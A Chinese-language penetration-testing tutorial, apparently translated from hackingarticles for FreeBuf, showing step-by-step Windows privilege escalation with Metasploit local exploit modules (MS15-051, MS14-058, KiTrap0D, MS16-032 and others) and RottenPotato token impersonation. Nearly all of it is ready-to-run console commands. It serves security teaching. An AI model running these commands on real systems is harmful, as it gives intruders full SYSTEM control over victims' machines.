****

**PS. 本文仅限于技术讨论，严禁用于其他用途。**

**继上一篇“使用自动化脚本进行Windows提权”，本文将介绍有关Windows内核漏洞提权的方法。我将使用内置的Metasploit模块作为演示。通过本文的学习，你将了解系统的哪些部分可被利用，并匹配最佳可利用模块进一步的提升权限。**

##  **Windows-Exploit-suggester**

Metasploit内置模块提供了各种可用于提权的local
exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local
exploits的麻烦。虽说如此，但也并非所有列出的local exploits都可用。所以，无论是漏洞利用还是查找最好的办法就是自动结合手动。

### **用法**

 **注：** 要使用local exploit suggester，我们必须已在目标机器上获取到了一个Meterpreter
session。在运行Local Exploit suggester之前，我们需要将现有的Meterpreter session调到后台运行（CTRL +
Z）

示例，假设我们现在有一个Meterpreter session 1

    
    
    use post/multi/recon/local_exploit_suggester
    set LHOST 192.168.1.107
    set SESSION 1
    exploit

如下图所示，它自动的为我们匹配出了一些可能的用于易受攻击目标提权的漏洞利用模块。

##
**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801740_5b99bbcce7873.png!small)**

##  **Windows ClientCopyImage Win32k Exploit**

Windows内核模式驱动程序特权提升漏洞。此模块利用了win32k.sys内核模式驱动程序中的不正确对象处理进行提权。

该模块已在Windows 7 x64和x86，Windows 2008 R2 SP1 x64的易受攻击版本上进行了测试。

让我们转到MSF控制台并执行该漏洞的exploit模块

    
    
    use exploit/windows/local/ms15_051_client_copy_image
    set lhost 192.168.1.107
    set session 1
    exploit

一旦exploit成功执行，就会打开另一个Meterpreter session

    
    
    getsystem
    getuid

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801763_5b99bbe333e8f.png!small)**

##  **Windows TrackPopupMenu Win32k NULL指针解引用**

此模块利用了win32k.sys中的NULL指针解引用，漏洞可通过TrackPopupMenu函数进行触发。在特殊情况下，我们可以滥用在xxxSendMessageTimeout上的NULL指针解引用，来实现任意代码执行操作。

该模块已在Windows XP SP3，Windows Server 2003 SP2，Windows 7 SP1 Windows Server 2008
32位和Windows Server 2008 R2 SP1 64位上进行了测试。

让我们转到MSF控制台并执行该漏洞的exploit模块

    
    
    use exploit/windows/local/ms14_058_track_popup_menu
    set lhost 192.168.1.107
    set session 1
    exploit

一旦exploit成功执行，就会打开另一个Meterpreter session

    
    
    getsystem
    getuid

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801776_5b99bbf02921f.png!small)**

##  **通过KiTrap0D提升** **Windows权限**

此模块将通过KiTrap0D
exploit创建具有SYSTEM权限的新会话，如果当前使用的会话权限已提升，则exploit将不会运行。该模块依赖于kitrap0d.x86.dll，因此在x64版本的Windows上不受支持。

该模块已在32位的Windows Server 2003，Windows Server 2008，Windows 7和XP易受攻击版本上进行了测试。

让我们转到MSF控制台并执行该漏洞的exploit模块

    
    
    use exploit/windows/local/ms10_015_kitrap0d
    set lhost 192.168.1.107
    set session 1
    exploit

一旦exploit成功执行，就会打开另一个Meterpreter session

    
    
    getsystem
    getuid

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801792_5b99bc00807a0.png!small)**

##  **Task Scheduler XML提权**

此漏洞发生在Task
Scheduler中，可允许用户提升权限。如果攻击者登录到受影响的系统，并运行特制应用程序，则该漏洞可能允许特权提升。攻击者必须拥有有效的登录凭据，并且能够在本地登录才能成功利用此漏洞。远程或匿名用户则无法利用此漏洞。

该模块已在Windows Vista，Windows 7，Windows Server 2008 x64和x86的易受攻击版本上进行了测试。

让我们转到MSF控制台并执行该漏洞的exploit模块

    
    
    use exploit/windows/local/ms10_092_schelevator
    set lhost 192.168.1.107
    set session 1
    exploit

一旦exploit成功执行，就会打开另一个Meterpreter session

    
    
    getsystem
    getuid

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801808_5b99bc10bfd98.png!small)**

##  **MS16-016 mrxdav.sys WebDav本地提权**

此模块利用了mrxdav.sys中的漏洞。其将在目标系统生成一个进程，并在执行payload之前将其权限提升到NT AUTHORITY\SYSTEM。

该模块已在Windows 7 SP1，x86架构的易受攻击版本上进行了测试。

让我们转到MSF控制台并执行该漏洞的exploit模块

    
    
    use exploit/windows/local/ms16_016_webdav
    set lhost 192.168.1.107
    set session 1
    exploit

一旦exploit成功执行，就会打开另一个Meterpreter session

    
    
    getsystem
    getuid

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801825_5b99bc210f0ea.png!small)**

##  **EPATHOBJ::pprFlattenRec本地提权**

此模块利用了EPATHOBJ :: pprFlattenRec上的漏洞，其主要问题出在使用了未初始化的数据（即允许损坏内存）。

目前，该模块已在Windows XP SP3，Windows 2003 SP1和Windows 7 SP1上成功进行了测试。

让我们转到MSF控制台并执行该漏洞的exploit模块

    
    
    use exploit/windows/local/ppr_flatten_rec
    set lhost 192.168.1.107
    set session 1
    exploit

一旦exploit成功执行，就会打开另一个Meterpreter session

    
    
    getsystem
    getuid

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801843_5b99bc331ae66.png!small)**

##  **MS13-053 : NTUserMessageCall Win32k内核池溢出**

Win32k中的内核池溢出漏洞，可允许本地用户提权。内核shellcode使winlogon.exe进程的ACL为NULL（SYSTEM进程）。这将允许任何非特权进程自由迁移到winlogon.exe，从而提升用户权限。注意：退出meterpreter会话时，可能会导致winlogon.exe崩溃。

目前，该模块已在Windows 7 SP1 x86上成功测试。

让我们转到MSF控制台并执行该漏洞的exploit模块

    
    
    use exploit/windows/local/ms13_053_ schlamperei
    set lhost 192.168.1.107
    set session 1
    exploit

一旦exploit成功执行，就会打开另一个Meterpreter session

    
    
    getsystem
    getuid

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801864_5b99bc481849a.png!small)**

##  **MS16-032 Secondary Logon Handle提权**

此模块利用了Windows Secondary Logon Service中缺少标准句柄过滤的问题。该漏洞主要影响Windows 7-10和2k8-2k12
32/64位版本。此模块仅适用于具有Powershell 2.0或更高版本的Windows系统，以及具有至少两个或以上CPU内核的系统。

    
    
    use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
    set session 1
    exploit

一旦exploit成功执行，就会打开另一个Meterpreter session

    
    
    getsystem
    getuid

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

**![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801880_5b99bc5885db8.png!small)**

##  **RottenPotato**

使用RottenPotato将服务帐户本地提权至SYSTEM。

首先，我们在meterpreter会话中使用以下选项查看当前系统上是否存在任何有效tokens。

    
    
    load incognito
    list_token -u

可以看到，当前并没有任何token可用。

![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801914_5b99bc7abe537.png!small)

现在，我们从github下载Rottenpotato **。**

    
    
    git clone https://github.com/foxglovesec/RottenPotato.git
    cd RottenPotato

下载完成后我们会在Rottenpotato目录下，看到一个rottenpotato.exe文件。

将该文件上传至受害者机器。

    
    
    upload /root/Desktop/RottenPotato/rottenpotato.exe .

![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801946_5b99bc9a9b523.png!small)

然后，键入以下命令执行该exe文件，并将SYSTEM token添加到impersonate user tokens下。

    
    
    execute -Hc -f rottenpotato.exe
    impersonate_token "NT AUTHORITY\\SYSTEM"

可以看到，我们当前的用户权限已提升为了 **NT AUTHORITY\SYSTEM**

![Windows内核漏洞利用提权教程](https://image.3001.net/images/20180913/1536801967_5b99bcafd97b5.png!small)

 ***参考来源：[hackingarticles](http://www.hackingarticles.in/windows-kernel-exploit-privilege-escalation/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

